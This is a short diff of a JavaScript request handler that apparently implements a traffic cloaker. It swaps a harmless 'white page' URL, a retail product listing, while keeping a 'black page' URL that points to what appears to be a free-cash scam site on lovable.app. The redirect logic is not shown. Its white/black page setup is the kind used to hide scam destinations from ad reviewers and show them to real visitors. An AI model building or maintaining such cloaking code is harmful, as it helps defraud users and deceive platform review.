@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://iloveminti.com/collections/summer-2526-boys-sweats/products/mnt1124-s25-sut-cr";
+    const whitePageURL = "https://www.otto.de/p/fc-bayern-muenchen-kapuzenpullover-fc-bayern-muenchen-i-hoodie-essential-i-kinder-i-navy-CS0GDC0BG/";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
 
     //testing
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
